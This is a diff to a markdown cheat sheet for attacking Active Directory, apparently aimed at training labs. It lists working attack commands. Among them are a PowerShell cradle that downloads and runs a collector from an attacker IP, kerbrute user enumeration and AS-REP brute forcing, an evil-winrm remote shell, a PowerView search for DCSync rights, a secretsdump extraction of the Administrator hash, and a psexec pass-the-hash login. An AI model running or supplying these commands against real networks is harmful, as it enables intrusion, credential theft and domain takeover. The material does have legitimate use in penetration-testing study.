@@ -1,6 +1,7 @@
 # Intro
 * Sources for this cheat sheet: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * Good list of AD pentest commands and tools: https://wadcoms.github.io/
+* Using impacket scripts input Domain Names in **lower case** if connection fails!
 
 # Reconaissance
 
@@ -34,7 +35,7 @@ Understanding the target AD environment is key to further exploitation.
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 
 1. Get Sharphound on target host to collect data for Bloodhound
-`iex(new-object net.webclient).downloadstring("http://10.10.14.43/SharpHound.ps1")`
+`iex(new-object net.webclient).downloadstring("http://10.10.14.43/AzureHound.ps1")`
 
 2. Invoke Bloodhound on target host and harvest data
 `invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`
@@ -43,13 +44,14 @@ OR
 
 use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
 
-`./bloodhound.py -d xxx.local -uxxx-xxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
+`./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
 
 # Exploitation
 
-## Brute Force
+## Brute Force ASREP roast
 
-* Itnitial exploitation can be attempted by trying to apply random exploits to the target using impacket
+* Sometimes remote access if possible if PREAUTH is misconfigure. Just try bruteforcing if
+* Important: need list of valid users! Check users using: `kerbrute userenum ...`
 * To get user list of users use: `enum4linux`
 
 ```
@@ -69,13 +71,28 @@ use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
 ```
 
 
+## Remote Shell
 
+* RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
+* SMB: use some exploit from SMB cheat sheet
 
+## Dsync Attack
+Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
 
-## Connection
+* Find accounts with permissions for DSync using **powerview**
 
-* RPC/SMB
+```
+Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
 
+```
+
+* Dump Admin credentials with an account that has **permissions to do so**
+
+`secretsdump.py xxx/usename@10.10.10.xxx -just-dc-user Administrator` 
+
+* Use extracted hash to perform pass the hash attack
+
+`psexec.py -hashes aad3b435b51404eeaad3b435b5140xxx:32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`
 
 # Lateral Movement
 
